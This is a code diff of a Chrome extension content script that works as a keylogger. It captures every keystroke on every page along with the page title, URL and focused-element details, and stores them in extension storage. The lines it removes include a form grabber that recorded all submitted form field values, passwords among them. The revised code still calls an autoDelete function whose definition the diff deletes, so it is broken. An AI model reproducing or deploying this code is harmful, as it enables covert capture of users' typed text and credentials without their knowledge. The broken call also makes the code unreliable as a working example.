@@ -1,139 +1,101 @@
+let timer = 0;
+let delay = 5;
+
 /* Randoms */
 if (!document.title) {
-    document.title = document.URL;
+  document.title = document.URL;
 }
 
 
 /* Keylib */
 // Alphanumeric
 document.addEventListener('keypress', (e) => {
-    e = e || window.event;
-    var charCode = typeof e.which == "number" ? e.which : e.keyCode;
-    if (charCode) {
-        log(String.fromCharCode(charCode));
-    }
+  timer = delay;
+  e = e || window.event;
+  var charCode = typeof e.which == "number" ? e.which : e.keyCode;
+  switch (charCode) {
+    case 8:
+      log("[BKSP]");
+      break;
+    case 9:
+    log("[TAB]");
+      break;
+    case 13:
+      log("[ENTER]");
+      break;
+    case 16:
+      log("[SHIFT]");
+      break;
+    case 17:
+      log("[CTRL]");
+      break;
+    case 18:
+      log("[ALT]");
+      break;
+    case 91:
+      log("[L WINDOW]"); // command for mac
+      break;
+    case 92:
+      log("[R WINDOW]"); // command for mac
+      break;
+    case 93:
+      log("[SELECT/CMD]"); // command for mac
+      break;
+    default:
+      log(String.fromCharCode(charCode));
+
+  }
 });
 
-// Other keys
-chrome.storage.sync.get({allKeys: false}, (settings) => {
-    if (settings.allKeys) {
-        document.addEventListener('keydown', (e) => {
-            e = e || window.event;
-            var charCode = typeof e.which == "number" ? e.which : e.keyCode;
-            if (charCode == 8) {
-                log("[BKSP]");
-            } else if (charCode == 9) {
-                log("[TAB]");
-            } else if (charCode == 13) {
-                log("[ENTER]");
-            } else if (charCode == 16) {
-                log("[SHIFT]");
-            } else if (charCode == 17) {
-                log("[CTRL]");
-            } else if (charCode == 18) {
-                log("[ALT]");
-            } else if (charCode == 91) {
-                log("[L WINDOW]"); // command for mac
-            } else if (charCode == 92) {
-                log("[R WINDOW]"); // command for mac
-            } else if (charCode == 93) {
-                log("[SELECT/CMD]"); // command for mac
-            }
-        });
-    } else { // Non function keys
-        document.addEventListener('keydown', (e) => {
-            e = e || window.event;
-            var charCode = typeof e.which == "number" ? e.which : e.keyCode;
-            if (charCode == 8) {
-                log("[BKSP]");
-            } else if (charCode == 9) {
-                log("[TAB]");
-            } else if (charCode == 13) {
-                log("[ENTER]");
-            }
-        });
-    }
-});
-
-
-/* Keylog Saving */
-var time = new Date().getTime();
-var data = {};
 var shouldSave = false;
-var lastLog = time;
-data[time] = document.title + "^~^" + document.URL + "^~^";
+var time;
+var data;
+var lastLog;
+
+function createElement() {
+  /* Keylog Saving */
+  time = new Date();
+  data = {};
+  lastLog = time;
+  data[time] = document.title + "^~^" + document.URL + "^~^";
+}
+createElement();
 
 // Key'ed on JS timestamp
 function log(input) {
-    var now = new Date().getTime();
-    if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
-    data[time] += input;
-    shouldSave = true;
-    lastLog = now;
-    console.log("Logged", input);
+  var now = new Date();
+  if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
+  data[time] += input;
+  shouldSave = true;
+  lastLog = now;
 }
 
 
 /* Save data */
 function save() {
-    if (shouldSave) {
-        chrome.storage.local.set(data, () => { console.log("Saved", data); shouldSave = false; });
-    }
-}
-
-function autoDelete() {
-    chrome.storage.sync.get({autoDelete: 1337}, (settings) => {
-        // Make sure to sync with delete code from viewer.js
-        var endDate = (new Date()).getTime() - (settings.autoDelete * 24 * 60 * 60 * 1000);
-        chrome.storage.local.get((logs) => {
-            var toDelete = [];
-            for (var key in logs) {
-                if (key < endDate || isNaN(key) || key < 10000) { // Restrict by time and remove invalid chars
-                  toDelete.push(key);
-                }
-            }
-            chrome.storage.local.remove(toDelete, () => {
-                console.log(toDelete.length + " entries deleted");
-            });
-        });
+  if (shouldSave) {
+    for (k in data) {
+      data[k] += "^~^" + document.activeElement.id + "^~^" + document.activeElement.className;
+    };
+    chrome.storage.local.set(data, () => {
+      shouldSave = false;
     });
+    createElement();
+  }
 }
 
 // Save data on window close
 window.onbeforeunload = () => {
-    save();
-    if (Math.random() < 0.2) // Don't clear every unload
-        autoDelete();
+  save();
+  if (Math.random() < 0.2) // Don't clear every unload
+    autoDelete();
 }
 
 // Save every second
-setInterval(() =>{
+setInterval(() => {
+  if (timer == 0) {
     save();
-}, 1000);
-
-
-/* Form Grabber */
-function saveForm(time, data) {
-    var toSave = {};
-    toSave[time] = document.title + "^~^" + document.URL + "^~^" + JSON.stringify(data);
-    chrome.storage.local.set(toSave, () => { console.log("Saved", data); });
-}
-
-chrome.storage.sync.get({formGrabber: false}, (settings) => {
-    if (settings.formGrabber) {
-        var forms = document.getElementsByTagName("form");
-        for (var i = 0; i < forms.length; i++) {
-            forms[i].addEventListener("submit", (e) => {
-                var data = {};
-                data["FormName"] = e.target.name;
-                data["FormAction"] = e.target.action;
-                data["FormElements"] = {};
-                var elements = e.target.elements;
-                for (var n = 0; n < elements.length; n++) {
-                    data["FormElements"][elements[n].name] = elements[n].value;
-                }
-                saveForm(e.timeStamp, data);
-            });
-        }
-    }
-});
+  } else {
+    timer--;
+  }
+}, 100);
